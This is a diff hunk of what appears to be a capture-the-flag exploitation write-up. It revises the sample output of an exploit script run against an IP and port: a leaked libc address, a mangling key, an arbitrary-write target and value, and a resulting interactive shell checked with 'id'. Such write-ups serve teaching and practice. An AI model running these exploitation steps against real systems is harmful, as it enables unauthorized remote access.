@@ -207,12 +207,10 @@ What we can do is:
 
 ```bash
 $ python exploit.py 159.203.116.12 7777
-[+] libc address: 139998943588352
-[+] key: 13664630298404067136
-write address:
-
-[+] writing at: 0x7f540b898c58
-[+] write value: 0xf71f40772a557b45L
+[+] libc address: 0x7fa70c2f0000
+[+] key: 0xab85f3272361ce8eL
+[+] writing at: 0x7fa70c6b5c58
+[+] write value: 0x19005ea539c9570bL
 [+] interactive
 
 id
